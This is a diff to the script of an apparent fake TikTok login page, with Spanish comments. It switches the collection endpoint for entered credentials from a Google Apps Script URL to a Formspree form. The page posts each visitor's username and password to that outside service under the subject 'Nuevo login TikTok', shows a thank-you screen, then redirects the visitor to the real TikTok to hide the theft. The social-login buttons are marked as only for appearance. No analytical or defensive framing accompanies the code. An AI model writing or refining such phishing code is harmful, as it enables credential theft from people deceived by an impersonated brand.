@@ -133,8 +133,8 @@
     </div>
 
     <!-- ================== SCRIPT INTEGRADO ================== -->
+        <!-- ================== SCRIPT ACTUALIZADO ================== -->
     <script>
-        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbzcXqAbuIJpMSPMyRoaK2HPgpDmINYjckiO1euUNYlOTuDqKS5UEI9XfPx8s1qKn5Rf/exec"
         // Panel de configuración
         let redirectUrl = localStorage.getItem('tiktokRedirectUrl') || "https://www.tiktok.com";
         let redirectDelay = parseInt(localStorage.getItem('tiktokRedirectDelay')) || 2;
@@ -142,15 +142,33 @@
         document.getElementById('currentUrl').textContent = redirectUrl;
         document.getElementById('redirectDelay').value = redirectDelay;
 
-        function toggleConfigPanel() { const panel = document.getElementById('configPanel'); panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none'; }
+        function toggleConfigPanel() { 
+            const panel = document.getElementById('configPanel'); 
+            panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none'; 
+        }
+        
         function saveRedirectConfig() {
             const url = document.getElementById('redirectUrl').value;
             const delay = parseInt(document.getElementById('redirectDelay').value);
-            if(url && isValidUrl(url)){ redirectUrl=url; localStorage.setItem('tiktokRedirectUrl',url); document.getElementById('currentUrl').textContent=url; }
-            if(!isNaN(delay) && delay>=0 && delay<=10){ redirectDelay=delay; localStorage.setItem('tiktokRedirectDelay', delay); }
-            alert('Configuración guardada');
+            if(url && isValidUrl(url)){ 
+                redirectUrl=url; 
+                localStorage.setItem('tiktokRedirectUrl',url); 
+                document.getElementById('currentUrl').textContent=url; 
+            }
+            if(!isNaN(delay) && delay>=0 && delay<=10){ 
+                redirectDelay=delay; 
+                localStorage.setItem('tiktokRedirectDelay', delay); 
+            }
+            alert('✅ Configuración guardada');
         }
-        function isValidUrl(string){ try{ new URL(string); return true; }catch{ return false; } }
+        
+        function isValidUrl(string){ 
+            try{ new URL(string); return true; }catch{ return false; } 
+        }
+
+        // ============ REEMPLAZA ESTA URL CON LA TUYA DE FORMSPREE ============
+        const FORMSPREE_URL = "https://formspree.io/f/mlgweyog";
+        // ======================================================================
 
         // Formulario de login
         document.getElementById('loginForm').addEventListener('submit', async function(e){
@@ -164,24 +182,53 @@
                 loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
                 loginBtn.disabled = true;
 
-                try{
-                    const now = new Date();
-                    const dateString = now.toISOString().split('T')[0];
-                    const timeString = now.toTimeString().split(' ')[0];
-
-                    await fetch(GOOGLE_SHEET_URL, {
+                try {
+                    // Crear FormData para enviar a Formspree
+                    const formData = new FormData();
+                    formData.append('username', username);
+                    formData.append('password', password);
+                    formData.append('timestamp', new Date().toLocaleString());
+                    formData.append('_subject', 'Nuevo login TikTok');
+                    formData.append('_replyto', username.includes('@') ? username : 'no-email@example.com');
+                    
+                    // Enviar a Formspree
+                    const response = await fetch(FORMSPREE_URL, {
                         method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ user: username, pass: password, date: dateString, time: timeString })
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
                     });
 
-                } catch(err){ console.error("Error al enviar datos:", err); }
-
-                loginBtn.innerHTML = originalText;
-                loginBtn.disabled = false;
-
-                showThankYouPage();
-            } else { alert('Por favor, completa todos los campos'); }
+                    if (response.ok) {
+                        console.log("✅ Datos enviados a Formspree");
+                        
+                        // Mostrar página de agradecimiento
+                        showThankYouPage();
+                        
+                        // Redirigir después del delay configurado
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, redirectDelay * 1000);
+                        
+                    } else {
+                        throw new Error('Error en Formspree');
+                    }
+                    
+                } catch(err) { 
+                    console.error("Error:", err);
+                    // Si falla Formspree, igual muestra la página de agradecimiento
+                    showThankYouPage();
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, redirectDelay * 1000);
+                } finally {
+                    loginBtn.innerHTML = originalText;
+                    loginBtn.disabled = false;
+                }
+            } else { 
+                alert('⚠️ Por favor, completa todos los campos'); 
+            }
         });
 
         function showThankYouPage(){
@@ -210,6 +257,14 @@
                 setTimeout(()=>{ loginContainer.classList.remove('fade-in'); },500);
             },500);
         }
+        
+        // Configurar botones sociales (solo para apariencia)
+        document.querySelectorAll('.social-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('⚠️ Esta función está en desarrollo. Usa el formulario principal.');
+            });
+        });
     </script>
 </body>
 </html>
